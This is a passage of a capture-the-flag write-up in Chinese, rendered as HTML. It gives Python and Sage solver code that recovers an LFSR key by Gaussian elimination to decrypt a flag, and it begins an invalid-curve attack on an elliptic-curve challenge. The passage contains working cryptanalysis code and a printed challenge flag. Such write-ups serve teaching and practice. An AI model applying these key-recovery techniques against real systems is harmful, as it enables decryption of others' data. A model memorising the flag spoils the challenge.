punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
outputState <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
ciphertext_hex <span class="token operator">=</span> <span class="token string">'4b3be165a0a0edd67ca8f143884826725107fd42d6a6'</span>

<span class="token comment"># 完整的流是 initState + outputState</span>
stream <span class="token operator">=</span> initState <span class="token operator">+</span> outputState

<span class="token comment"># 2. 高斯消元法求解 Mask (GF(2))</span>
<span class="token keyword">def</span> <span class="token function">solve_lfsr</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> N<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 构建矩阵 A 和 向量 b</span>
    <span class="token comment"># Matrix A: rows are state windows</span>
    <span class="token comment"># Vector b: next bits</span>
    A <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>stream<span class="token punctuation">[</span>i <span class="token punctuation">:</span> i<span class="token operator">+</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span>
        b<span class="token punctuation">.</span>append<span class="token punctuation">(</span>stream<span class="token punctuation">[</span>i<span class="token operator">+</span>N<span class="token punctuation">]</span><span class="token punctuation">)</span>
    
    <span class="token comment"># 高斯消元</span>
    <span class="token comment"># 转换为增广矩阵</span>
    M <span class="token operator">=</span> <span class="token punctuation">[</span>row <span class="token operator">+</span> <span class="token punctuation">[</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i<span class="token punctuation">,</span> row <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">]</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 寻找主元</span>
        pivot <span class="token operator">=</span> i
        <span class="token keyword">while</span> pivot <span class="token operator">&lt;</span> N <span class="token keyword">and</span> M<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            pivot <span class="token operator">+=</span> <span class="token number">1</span>
        
        <span class="token keyword">if</span> pivot <span class="token operator">==</span> N<span class="token punctuation">:</span>
            <span class="token keyword">continue</span> <span class="token comment"># 无解或多解情况，这里假设数据完好</span>
            
        <span class="token comment"># 交换行</span>
        M<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> M<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span> <span class="token operator">=</span> M<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">,</span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        
        <span class="token comment"># 消元</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> i <span class="token operator">!=</span> j <span class="token keyword">and</span> M<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token comment"># 行异或</span>
                <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    M<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> M<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span>
    
    <span class="token comment"># 提取解</span>
    mask <span class="token operator">=</span> <span class="token punctuation">[</span>row<span class="token punctuation">[</span>N<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> M<span class="token punctuation">]</span>
    <span class="token keyword">return</span> mask

<span class="token comment"># 求解 mask</span>
mask <span class="token operator">=</span> solve_lfsr<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>

<span class="token comment"># 3. 还原 Key</span>
<span class="token comment"># 代码逻辑: key = bytes(int(''.join(str(bit) for bit in mask[i*8:(i+1)*8]), 2) for i in range(16))</span>
key_bytes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    byte_bits <span class="token operator">=</span> mask<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">8</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">]</span>
    byte_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> byte_bits<span class="token punctuation">)</span>
    key_bytes<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>byte_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Recovered Key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 4. 解密</span>
<span class="token comment"># keystream = (key * (len(plaintext)//16 + 1))[:len(plaintext)]</span>
<span class="token comment"># return bytes(p ^ k for p, k in zip(plaintext, keystream))</span>

ct <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>ciphertext_hex<span class="token punctuation">)</span>
keystream <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">]</span>

plaintext <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c <span class="token operator">^</span> k <span class="token keyword">for</span> c<span class="token punctuation">,</span> k <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> keystream<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\nFLAG: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>plaintext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token comment">#ISCTF&#123;lf5R_jUst_So_s0&#125;</span></code></pre>

<h3 id="沉迷数学的小蓝鲨"><a href="#沉迷数学的小蓝鲨" class="headerlink" title="沉迷数学的小蓝鲨"></a>沉迷数学的小蓝鲨</h3><p>给定的公钥 $Q$ 并不在题目描述的曲线上，而是落在一个参数 $b$ 被篡改的曲线上，且该曲线的阶具有光滑，从而可以使用 Pohlig-Hellman 算法求解离散对数。 此外，生成元 $G$ 使用的是标准 secp256k1 基点的 x 坐标。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">solve_isctf_challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ISCTF 'Little Blue Shark' Solver (Invalid Curve Attack)"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span>

    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 1. 题目参数定义</span>
    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># secp256k1 的标准素数 p</span>
    p <span class="token operator">=</span> <span class="token number">0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F</span>
    F <span class="token operator">=</span> GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

    <span class="token comment"># 题目给出的公钥 Q</span>
    qx <span class="token operator">=</span> <span class="token number">0xa61ae2f42348f8b84e4b8271ee8ce3f19d7760330ef6a5f6ec992430dccdc167</span>
    qy <span class="token operator">=</span> <span class="token number">0x8a3ceb15b94ee7c6ce435147f31ca8028d1dd07a986711966980f7de20490080</span>

    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 2. 漏洞利用：恢复错误的曲线参数 b</span>
    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 验证发现点 Q 不在 y^2 = x^3 + 3x + 27 上</span>
    <span class="token comment"># 因此这是 Invalid Curve Attack，我们需要反推 b'</span>
    <span class="token comment"># b' = y^2 - (x^3 + 3x) mod p</span>
    b_real <span class="token operator">=</span> F<span class="token punctuation">(</span>qy<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token punctuation">(</span>F<span class="token punctuation">(</span>qx<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">3</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token operator">*</span>F<span class="token punctuation">(</span>qx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Recovered faulty curve parameter b:\n    </span><span class="token interpolation"><span class="token punctuation">&#123;</span>b_real<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token comment"># 定义这条“错误”的曲线 E'</span>
    E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>F<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> b_real<span class="token punctuation">]</span><span class="token punctuation">)</span>
    Q_point <span class="token operator">=</span> E<span class="token punctuation">(</span>qx<span class="token punctuation">,</span> qy<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Point Q is valid on the recovered curve."</span><span class="token punctuation">)</span>

    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 3. 确定生成元 G</span>
    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 在此类攻击中，通常使用标准 secp256k1 基点的 X 坐标映射到错误曲线上</span>
    gx_secp <span class="token operator">=</span> <span class="token number">0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798</span>
    
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment"># lift_x 会寻找具有该 x 坐标的有效点</span>
        G <span class="token operator">=</span> E<span class="token punctuation">.</span>lift_x<span class="token punctuation">(</span>Integer<span class="token punctuation">(</span>gx_secp<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Generator G recovered (from secp256k1 x-coord)."</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Failed to lift secp256k1 generator."</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>

    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 4. 求解离散对数 k (Q = k * G)</span>
    <span class="token comment"># ---------------------------------------------------------</span>
    <span class="token comment"># 曲线阶包含非常大的素数因子，直接计算会卡死。</span>
    <span class="token comment"># 但由于题目设计，k 通常较小，或者我们只需要利用小因子。</span>
    <span class="token comment"># 使用 bounds 参数强制 Sage 使用 BSGS (小步大步法) 在小范围内搜索。</span>
    
